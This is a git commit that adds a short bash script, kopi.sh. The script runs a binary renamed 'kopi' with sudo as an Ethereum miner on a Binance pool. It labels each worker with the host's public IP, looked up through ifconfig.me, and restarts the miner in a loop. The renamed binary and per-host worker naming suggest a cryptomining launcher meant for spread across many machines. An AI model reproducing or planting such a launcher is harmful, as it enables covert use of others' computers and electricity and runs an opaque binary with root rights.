17265eba6d92b22f96af3740ed1c9d219b026f47
adefff <108704960+adefff@users.noreply.github.com>
2024-01-31 04:54:50 -0800

    Create kopi.sh

---
+++ kopi.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+cd "$(dirname "$0")"
+
+chmod +x ./kopi && sudo ./kopi --coin ETH --pool ethash.poolbinance.com:1800 --user adethiax.$(echo "$(curl -s ifconfig.me)" | tr . _ )
+while [ $? -eq 42 ]; do
+    sleep 10s
+    chmod +x ./kopi && sudo ./kopi --coin ETH --pool ethash.poolbinance.com:1800 --user adethiax.$(echo "$(curl -s ifconfig.me)" | tr . _ )
+done
